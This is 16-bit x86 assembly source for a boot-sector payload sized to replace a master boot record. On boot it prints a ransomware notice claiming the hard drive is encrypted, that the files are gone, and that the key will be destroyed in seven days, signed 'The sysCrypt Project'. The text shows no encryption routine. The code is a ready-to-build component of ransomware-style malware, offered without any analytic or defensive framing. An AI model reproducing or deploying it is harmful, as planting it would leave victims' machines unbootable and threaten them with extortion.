[BITS 16]
[ORG 0x7C00]
MOV SI, Msg
CALL OutStr
JMP $
OutChar:
MOV AH, 0x0E
MOV BH, 0x00
MOV BL, 0x07
INT 0x10
RET
OutStr:
next_char:
MOV AL, [SI]
INC SI
OR AL, AL
JZ exit_function
CALL OutChar
JMP next_char
exit_function:
RET
Msg db 0xA, 0xD, 0xA, 0xD
   db '########################################################', 0xA, 0xD
   db '#   Your harddrive is encrypted                        #', 0xA, 0xD
   db '#   You wont get your files back                       #', 0xA, 0xD
   db '           			                                    ', 0xA, 0xD
   db '########################################################', 0xA, 0xD, 0xA, 0xD
   db 'Unfortunately there are only 7 days left until the encryption key is destroyed.', 0xA, 0xD, 0xA, 0xD
   db '     The sysCrypt Project', 0
TIMES 510 - ($ - $$) db 0
DW 0xAA55